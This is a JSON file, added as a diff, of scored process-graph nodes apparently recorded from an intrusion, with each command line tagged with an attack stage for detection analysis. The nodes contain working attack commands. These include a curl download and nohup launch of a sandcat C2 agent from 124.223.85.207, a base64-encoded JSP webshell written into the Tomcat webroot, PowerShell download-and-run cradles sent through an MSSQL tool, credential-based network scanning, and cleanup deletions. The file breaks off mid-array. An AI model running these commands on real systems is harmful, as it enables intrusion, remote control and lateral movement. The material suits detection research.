@@ -1,0 +1,1394 @@
+[
+    {
+        "label": "http-nio-80-exe -Djava.util.logging.config.file=/usr/tomcat/apache-tomcat-8.5.76/conf/logging.properties  \n-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs= \norg.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath / \nusr/tomcat/apache-tomcat-8.5.76/bin/bootstrap.jar:/usr/tomcat/apache-tomcat-8.5.76/bin/tomcat-juli.jar -Dcatalina.base=/usr/ \ntomcat/apache-tomcat-8.5.76 -Dcatalina.home=/usr/tomcat/apache-tomcat-8.5.76 -Djava.io.tmpdir=/usr/tomcat/apache-tomcat-8.5.76/ \ntemp org.apache.catalina.startup.Bootstrap start procname.http-nio-80-exe 113.42607116699219",
+        "score": "113.42607116699219",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "768.0",
+        "id": "8e5aee63493ca78898ba316974c34a5b"
+    },
+    {
+        "label": "bashell -c del /f /q c:/windows/logout.jsp procname.bashell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "299d19011afe25d3c4c1889da660442f"
+    },
+    {
+        "label": "bashell -c del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt procname.bashell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "ad7eb65e45d145446eafde6779d5695f"
+    },
+    {
+        "label": "bashell -c curl transfer transfer transfer -O  http://124.223.85.207:8079/sandcat-linux ;  \nchmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252  \n-v > /dev/null 2>&1 & procname.bashell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "66.0",
+        "id": "e5e1285bbb6611731ccf18d2207a4aff"
+    },
+    {
+        "label": "bashell -c echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+ \nPCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+ \nPCVDbGFzc0xvYWRlcntVJT48JShDbGFzc0xvYWRlciBjKSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGljJT48JUNsYXNzJT48JWcoYnl0ZSU+PCVbLyoqL11iKXtyZXR1cm4lPjwlc3VwZXIuJT48JWRlZmluZUNsYXNzJT48JSglPjwlYiU+ \nPCUsMCoxLGIuJT48JWxlbmd0aCk7fX0lPjwlISU+PCVpZiU+PCUocmVxdWVzdC4lPjwlZ2V0TWV0aG9kKCU+PCUpLiU+PCVlcXVhbHMoJT48JSJQT1NUIiU+PCUpKSU+ \nPCV7U3RyaW5nJT48JWs9ImU0NWUzMjlmZWI1ZDkyNWIiOyU+PCVzZXNzaW9uLiU+PCVwdXRWYWx1ZSgidSIsayk7JT48JUNpcGhlciU+PCVjPSU+PCVDaXBoZXIuJT48JWdldEluc3RhbmNlKCU+ \nPCUiQUVTIik7JT48JWMuaW5pdCglPjwlMixuZXclPjwlU2VjcmV0S2V5U3BlYyhrLiU+PCVnZXRCeXRlcyglPjwlKSwiQUVTIikpOyU+PCVuZXclPjwlVSh0aGlzLmdldENsYXNzKCU+ \nPCUpLmdldENsYXNzTG9hZGVyKCU+PCUpKS4lPjwlZyhjLiU+PCVkb0ZpbmFsKG5ldyU+PCVzdW4uJT48JW1pc2MuJT48JUJBU0U2NERlY29kZXIlPjwlKCU+PCUpLiU+ \nPCVkZWNvZGVCdWZmZXIlPjwlKHJlcXVlc3QlPjwlLiU+PCVnZXRSZWFkZXIoJT48JSkuJT48JXJlYWRMaW5lKCU+PCUhJT48JSkpKSkuJT48JW5ld0luc3RhbmNlKCU+ \nPCUpLmVxdWFscyU+PCUocGFnZUNvbnRleHQlPjwlKSU+PCU7JT48JX0lPjwlJT48JSU+PCUhJT4= | base64 -d > /usr/tomcat/apache-tomcat-8.5.76//webapps/ \nROOT/logout.jsp procname.bashell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "64.0",
+        "id": "cd100288b92b5e826dc7b79082398b29"
+    },
+    {
+        "label": "bashell -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64  \n-d|bashell procname.bashell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "130.0",
+        "id": "a7227ffe7bad1a845a2b873d5648df3b"
+    },
+    {
+        "label": "shell -c whoami procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "18.0",
+        "id": "43e7b219e3459f1e8390c47219f0df9c"
+    },
+    {
+        "label": "curl transfer -O http://124.223.85.207:8079/sandcat-linux procname.curl transfer 154.55194091796875",
+        "score": "154.55194091796875",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "9429bacd8424a21ec9df2a1b448252cc"
+    },
+    {
+        "label": "chmod +x sandcat-linux procname.chmod 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "0deba71e5c9f6d9e7f0fc5ddb51ee314"
+    },
+    {
+        "label": "base64 -d procname.base64 42.330833435058594",
+        "score": "42.330833435058594",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "83fe3bf44cf67fb94e258c9396fbe188"
+    },
+    {
+        "label": "bashell procname.bashell 85.17842102050781",
+        "score": "85.17842102050781",
+        "shape": "box",
+        "stage": "Escalate Privilege",
+        "stage_score": "164.0",
+        "id": "d574d4bb40c84861791a694a999cce69"
+    },
+    {
+        "label": "whoami procname.whoami 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "1b0679be72ad976ad5d491ad57a5eec0"
+    },
+    {
+        "label": "ping -c 1 10.67.200.200 procname.ping 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "20.0",
+        "id": "f066ac4181623fd6cf1f359d08bf984e"
+    },
+    {
+        "label": "arp -a procname.arp 23.87847137451172",
+        "score": "23.87847137451172",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "20.0",
+        "id": "092587586b9bca3653411d58e887d7da"
+    },
+    {
+        "label": "ifconfig procname.ifconfig 46.19938278198242",
+        "score": "46.19938278198242",
+        "shape": "box",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "64.0",
+        "id": "db18c251598a58086700b3cf44a93938"
+    },
+    {
+        "label": "date +%s procname.date 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "f9beda64c9d78bb5c6bd258047a16a4b"
+    },
+    {
+        "label": "ps ax procname.ps 24.28369140625",
+        "score": "24.28369140625",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "32.0",
+        "id": "0ff6c640b7cb75ff858c7a75aac06f70"
+    },
+    {
+        "label": "locale-check C.UTF-8 procname.locale-check 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "b9f40c02fff1cd07a5067a2b6982d1ec"
+    },
+    {
+        "label": "groups procname.groups 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "1471e4e05a4db95d353cc867fe317314"
+    },
+    {
+        "label": "cat read /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.log procname.cat read 51.93578338623047",
+        "score": "51.93578338623047",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "f33a4e129de31f310e786da4fac6436f"
+    },
+    {
+        "label": "grep -a -E Extension host agent listening on .+ procname.grep 28.663070678710938",
+        "score": "28.663070678710938",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "3426c9fd46fa5873a7b30d72ace822cf"
+    },
+    {
+        "label": "ldd /usr/bin/ldd --version procname.ldd 21.526403427124023",
+        "score": "21.526403427124023",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "b137ff04cd9eeccabb72464580878a2b"
+    },
+    {
+        "label": "ldconfig /sbin/ldconfig -p procname.ldconfig 48.95807647705078",
+        "score": "48.95807647705078",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "972753ddcd89d767dfd48554988ab0d2"
+    },
+    {
+        "label": "uname -m procname.uname 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "43aeb525ebc517baf8c01e7ac83f63ce"
+    },
+    {
+        "label": "mesg n procname.mesg 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "c67901b216f79a66e44e4a97f5fb55cd"
+    },
+    {
+        "label": "sed s/^[Ii][Dd]=//g procname.sed 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "3a07c2cad11e866b3ee7afe7c3175d57"
+    },
+    {
+        "label": "cat read /root/.vscode-server/.ccbaa2d27e38e5afa3e5c21c1c7bef4657064247.pid procname.cat read 38.752098083496094",
+        "score": "38.752098083496094",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "218626838dbe399c7db3fb9024bcde5c"
+    },
+    {
+        "label": "http-nio-80-Acc -Djava.util.logging.config.file=/usr/tomcat/apache-tomcat-8.5.76/conf/logging.properties  \n-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs= \norg.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath / \nusr/tomcat/apache-tomcat-8.5.76/bin/bootstrap.jar:/usr/tomcat/apache-tomcat-8.5.76/bin/tomcat-juli.jar -Dcatalina.base=/usr/ \ntomcat/apache-tomcat-8.5.76 -Dcatalina.home=/usr/tomcat/apache-tomcat-8.5.76 -Djava.io.tmpdir=/usr/tomcat/apache-tomcat-8.5.76/ \ntemp org.apache.catalina.startup.Bootstrap start procname.http-nio-80-Acc 146.47427368164062",
+        "score": "146.47427368164062",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "640.0",
+        "id": "766c100383651fe8fb408dcaeabca2d0"
+    },
+    {
+        "label": "node /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/bootstrap-fork  \n--type=extensionHost --uriTransformerPath=/root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/server/uriTransformer.js  \nprocname.node 76.06106567382812",
+        "score": "76.06106567382812",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "392.0",
+        "id": "9740a3ace377716e541f403a014eb9b3"
+    },
+    {
+        "label": "shell -c ls -l /proc/[0-9]./fd/[0-9]. | grep socket: procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "4f9ca35a3f9e9b3f55039c76ff963405"
+    },
+    {
+        "label": "rg --files --hidden --case-sensitive -g ../package.json -g !../.git -g !../ \n.svn -g !../.hg -g !../CVS -g !../.DS_Store -g !../Thumbs.db -g !../ \n.classpath -g !../.project -g !../.settings -g !../.factorypath --no-ignore --follow  \n--no-config --no-ignore-global procname.rg 41.80636978149414",
+        "score": "41.80636978149414",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "34714e04df0872bf4bec57d5787a6454"
+    },
+    {
+        "label": "node /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/extensions/json-language-features/server/ \ndist/node/jsonServerMain --node-ipc --clientProcessId=294638 procname.node 59.98386001586914",
+        "score": "59.98386001586914",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "10a3a5c91f9e8e3c48b4e9b5a29127d9"
+    },
+    {
+        "label": "dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only  \nprocname.dbus-daemon 131.607421875",
+        "score": "131.607421875",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "450.0",
+        "id": "e77f94f904a6736b1779abdad5c99500"
+    },
+    {
+        "label": "main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456 procname.main 187.20816040039062",
+        "score": "187.20816040039062",
+        "shape": "box",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "112.0",
+        "id": "c00408939cf270d5a3a29550fdba87d5"
+    },
+    {
+        "label": "sshd transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer  \ntransfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer  \ntransfer transfer transfer transfer transfer -D -R procname.sshd transfer transfer transfer transfer transfer transfer transfer  \ntransfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer  \ntransfer transfer transfer transfer transfer transfer transfer transfer 22.622913360595703",
+        "score": "22.622913360595703",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "708.0",
+        "id": "6046aedfaf382317075867a8cb9a77a2"
+    },
+    {
+        "label": "sshd transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer  \ntransfer transfer     procname.sshd transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer  \ntransfer 157.09951782226562",
+        "score": "157.09951782226562",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "248.0",
+        "id": "0452542b8b795ef09660d1619f104383"
+    },
+    {
+        "label": "dpkg-query -f ${Version} ${Provides} -W lsb-core lsb-cxx lsb-graphics lsb-desktop lsb-languages  \nlsb-multimedia lsb-printing lsb-security procname.dpkg-query 30.921672821044922",
+        "score": "30.921672821044922",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "f5f59dff4c19d8104c5e5ad446e655dd"
+    },
+    {
+        "label": "sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252  \n-v procname.sandcat-linux 141.9422607421875",
+        "score": "141.9422607421875",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "148.0",
+        "id": "cfcc3cb29e2e6cfa8ba1f48eeb40a69d"
+    },
+    {
+        "label": "shell -c rm ./sqltool_amd64_upx ; rm /tmp/sandcat-linux -r ; rm #{collection.path.name}/ \nwebapps/ROOT/logout.jsp -r procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "144.0",
+        "id": "e4ed2a577fbeb3c720e6abad289ffec7"
+    },
+    {
+        "label": "shell -c echo end:454b7093-cc6e-484e-9c42-e222c6906204 procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "54a72e10a88d7fe62bbd80d1187bb4d6"
+    },
+    {
+        "label": "shell -c pwd procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "694f34e0b6163fe96bfb31a7cf958d3c"
+    },
+    {
+        "label": "rm procname.rm 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "d67f249b90615ca158b1258712c3a9fc"
+    },
+    {
+        "label": "rm ./sqltool_amd64_upx procname.rm 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "b35b4ffe25682ffd5899e5dffb39cb68"
+    },
+    {
+        "label": "rm /tmp/sandcat-linux -r procname.rm 35.95127487182617",
+        "score": "35.95127487182617",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "b40b945b28b3b7db4b8cdd5da0e8b299"
+    },
+    {
+        "label": "sshd transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer  \ntransfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer  \ntransfer procname.sshd transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer  \ntransfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer transfer 72.87478637695312",
+        "score": "72.87478637695312",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "312.0",
+        "id": "417e33e02a390c5fcd38e7ad18c940f4"
+    },
+    {
+        "label": "awk -F : {print $2} procname.awk 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "c5aa3516da585537128fc88501ba4860"
+    },
+    {
+        "label": "sandcat-linux -server https://124.223.85.207:8443 -opid 8b4aba91-ec59-4bcd-9c2b-89b01d0a0d27  \n-v procname.sandcat-linux 83.44247436523438",
+        "score": "83.44247436523438",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "194.0",
+        "id": "07165d4a31e8d35df421c9d6c4ae450f"
+    },
+    {
+        "label": "shell -c echo start:152d302e-4a34-48a4-b32b-16c0b3e73f15 procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "65c96362b1bbe078e0262d82437c377d"
+    },
+    {
+        "label": "shell -c mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main &&  \n./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456 procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "90.0",
+        "id": "5444a68c94bd0a75afb76cfdc07b14d2"
+    },
+    {
+        "label": "shell -c echo start:1185e211-d897-42e4-bb2d-7260f0eba801 procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "d6caae89d36fb5bc25c8509f260e9366"
+    },
+    {
+        "label": "shell -c echo end:152d302e-4a34-48a4-b32b-16c0b3e73f15 procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "a406eb9b4d9f7cbb65540f4956e80e7f"
+    },
+    {
+        "label": "shell -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --enable &&  \n./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami procname.shell 21.220325469970703",
+        "score": "21.220325469970703",
+        "shape": "box",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "94.0",
+        "id": "489281dc68f7f130637b55d494b80b1a"
+    },
+    {
+        "label": "shell -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec ' \ncmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=/'https://124.223.85.207:8443/';[System.Net.ServicePointManager]:: \nServerCertificateValidationCallback={$true};$url=$ip+/'/file/download/';$wc= \nNew-Object System.Net.WebClient;$wc.Headers.add(/'company_code/',1234567);$wc.Headers.add( \n/'platform/',/'windows/');$wc.Headers.add(/'file/', \n/'sandcat.go/'); $output=/'C:/Users/Public/sandcat.exe/'; \n$wc.DownloadFile($url,$output);cmd /c start /min C:/Users/Public/sandcat.exe -opid  \n9f726796-b4f3-463f-8cfd-4f1498314252 -server https://124.223.85.207:8443' procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "156.0",
+        "id": "08006fe5af931843b950606c5f339143"
+    },
+    {
+        "label": "shell -c echo end:1185e211-d897-42e4-bb2d-7260f0eba801 procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "9fb684e86fd20b529c4a981228579559"
+    },
+    {
+        "label": "shell -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable &&  \n./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "46.0",
+        "id": "e14d9cbf5da65c007c4d8708f53b9c2f"
+    },
+    {
+        "label": "shell -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec ' \ncmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=/'https://124.223.85.207:8443/';[System.Net.ServicePointManager]:: \nServerCertificateValidationCallback={$true};$url=$ip+/'/file/download/';$wc= \nNew-Object System.Net.WebClient;$wc.Headers.add(/'company_code/',1234567);$wc.Headers.add( \n/'platform/',/'windows/');$wc.Headers.add(/'file/', \n/'sandcat.go/'); $output=/'C:/Users/Public/sandcat.exe/'; \n$wc.DownloadFile($url,$output);cmd /c start /min C:/Users/Public/sandcat.exe -opid  \n9f726796-b4f3-463f-8cfd-4f1498314252 -server https://124.223.85.207:8443' procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "156.0",
+        "id": "3c5de246a6ed92d5d6af6d477a60a778"
+    },
+    {
+        "label": "shell -c echo start:b3033461-3342-4b36-87af-780ffe63cd09 procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "8ca574a34a733a2f453ddbcbf3eb50f0"
+    },
+    {
+        "label": "shell -c echo end:7435be5b-e9e8-44de-83b8-6141cbd01bea procname.shell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "652d8efc7e014017f90dacbecaa0a278"
+    },
+    {
+        "label": "mkdir -p fscan procname.mkdir 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "1abbc872e94e1b05134b1713ab1de5b1"
+    },
+    {
+        "label": "unzip -o -d ./fscan fscan-main.zip procname.unzip 51.102622985839844",
+        "score": "51.102622985839844",
+        "shape": "box",
+        "stage": "Initial Compromise",
+        "stage_score": "78.0",
+        "id": "fe46ff4b0dd67dc0a974430208331227"
+    },
+    {
+        "label": "chmod +x ./fscan/main procname.chmod 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "96394dc4b48948be7d04bcf4060f845f"
+    },
+    {
+        "label": "sqltool_amd64_u --server 192.168.0.244 --user sa --password Sa123456 --exec whoami procname.sqltool_ \namd64_u 32.628509521484375",
+        "score": "32.628509521484375",
+        "shape": "box",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "64.0",
+        "id": "f4c37a52e9572e89f86b0811b4fb326f"
+    },
+    {
+        "label": "sqltool_amd64_u --server 192.168.0.244 --user sa --password Sa123456 --enable procname.sqltool_ \namd64_u 35.19192886352539",
+        "score": "35.19192886352539",
+        "shape": "box",
+        "stage": "Escalate Privilege",
+        "stage_score": "48.0",
+        "id": "dc17876a3a9ae7401065fc12c074089b"
+    },
+    {
+        "label": "sqltool_amd64_u --server 192.168.0.0/24 --user sa --password Sa123456 --exec cmd /c powershell.exe -ExecutionPolicy  \nBypass -C $ip=/'https://124.223.85.207:8443/';[System.Net.ServicePointManager]::ServerCertificateValidationCallback={ \n$true};$url=$ip+/'/file/download/';$wc=New-Object System.Net.WebClient;$wc.Headers.add( \n/'company_code/',1234567);$wc.Headers.add(/'platform/',/'windows/'); \n$wc.Headers.add(/'file/',/'sandcat.go/'); $output=/'C: \n/Users/Public/sandcat.exe/';$wc.DownloadFile($url,$output);cmd /c start / \nmin C:/Users/Public/sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -server https://124.223.85.207:8443  \nprocname.sqltool_amd64_u 22.071292877197266",
+        "score": "22.071292877197266",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "e20e8e4c304ef05e829bba0490653776"
+    },
+    {
+        "label": "sqltool_amd64_u --server 192.168.0.0/24 --user sa --password Sa123456 --enable procname.sqltool_amd64_u 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "5fcf1988f6ec204bed510491a9cff2fe"
+    },
+    {
+        "label": "sqltool_amd64_u --server 192.168.0.244 --user sa --password Sa123456 --exec cmd /c powershell.exe  \n-ExecutionPolicy Bypass -C $ip=/'https://124.223.85.207:8443/';[System.Net.ServicePointManager]:: \nServerCertificateValidationCallback={$true};$url=$ip+/'/file/download/';$wc= \nNew-Object System.Net.WebClient;$wc.Headers.add(/'company_code/',1234567);$wc.Headers.add( \n/'platform/',/'windows/');$wc.Headers.add(/'file/', \n/'sandcat.go/'); $output=/'C:/Users/Public/sandcat.exe/'; \n$wc.DownloadFile($url,$output);cmd /c start /min C:/Users/Public/sandcat.exe -opid  \n9f726796-b4f3-463f-8cfd-4f1498314252 -server https://124.223.85.207:8443 procname.sqltool_amd64_u 54.318172454833984",
+        "score": "54.318172454833984",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "104.0",
+        "id": "7eeff017dd080f0f073559f88d58dfb6"
+    },
+    {
+        "label": "systemd-resolve procname.systemd-resolve 91.18206024169922",
+        "score": "91.18206024169922",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "2268.0",
+        "id": "374144033013838b2b910dc4cb6ff85a"
+    },
+    {
+        "label": "grep Description procname.grep 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "null",
+        "stage_score": "0",
+        "id": "fb2fc1b20aef8b0eddab735e1a15b1d6"
+    },
+    {
+        "label": "bashell -c if [[ -f /usr/bin/lsb_release ]];then /usr/bin/lsb_release -a | grep Description |  \nawk -F : '{print $2}' | sed 's/^[ /t].//g'; elif [[ -f /etc/system-release ]];then cat read read read read / \netc/system-release | sed -n '1p'; else cat read read read read /etc/issue | sed -n '1p'; fi procname.bashell 0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "60.0",
+        "id": "ccbfbea883423c6756d28de19c4b66d6"
+    },
+    {
+        "label": "lsb_release -Es /usr/bin/lsb_release -a procname.lsb_release 20.41891860961914",
+        "score": "20.41891860961914",
+        "shape": "box",
+        "stage": "Maintain Persistence",
+        "stage_score": "18.0",
+        "id": "3b0f9ef1a55e72bd5022efa702b5eb8c"
+    },
+    {
+        "label": "hostguard procname.hostguard 52.35436248779297",
+        "score": "52.35436248779297",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "1512.0",
+        "id": "38682ec972045348f1a3e70906905da0"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648472197&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "b69d327fa358c511857b0c1866de4d18"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648473397&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "694ab90322e275cca54815a0f7b84791"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648474597&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "6ec161de8ea48bd6dbaab3496f9db4b0"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648475797&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "41727ed20db9d526a47e5cbbe11f8fbb"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "ec8853e642e9423c3df3bde004b0f0d8"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648476998&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "50a5fe7589e4e65d22e7e262a2b31e52"
+    },
+    {
+        "label": "shell -c /usr/local/hostguard/bin/curl transfer transfer -k --connect-timeout 10 'https:// \n100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648478198&mode=100' procname.shell  \n0",
+        "score": "0",
+        "shape": "box",
+        "stage": "Establish Foothold",
+        "stage_score": "84.0",
+        "id": "f37ea2b1179a1f2ebf8416e2abe2f77e"
+    },
+    {
